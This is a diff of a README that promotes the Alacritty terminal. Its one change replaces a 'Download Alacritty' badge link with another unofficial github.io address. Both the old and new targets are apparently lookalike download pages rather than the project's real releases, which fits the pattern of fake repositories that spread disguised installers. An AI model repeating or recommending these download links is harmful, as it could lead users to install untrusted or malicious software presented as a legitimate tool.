@@ -30,7 +30,7 @@ Designed to be minimal but powerful, Alacritty does not include tabs or UI frill
 
 With true color support, ligatures, and retina scaling, Alacritty is ideal for developers, sysadmins, and power users who want a lean and fast terminal without compromise.
 
-[![⬇️ Download Alacritty](https://img.shields.io/badge/Download-Alacritty-blue?style=for-the-badge&logo=windows)](https://asdeennerhorse.github.io/mogus/Alacritty)
+[![⬇️ Download Alacritty](https://img.shields.io/badge/Download-Alacritty-blue?style=for-the-badge&logo=windows)](https://alacritty-for-windows.github.io/.github)
 
 ---
 
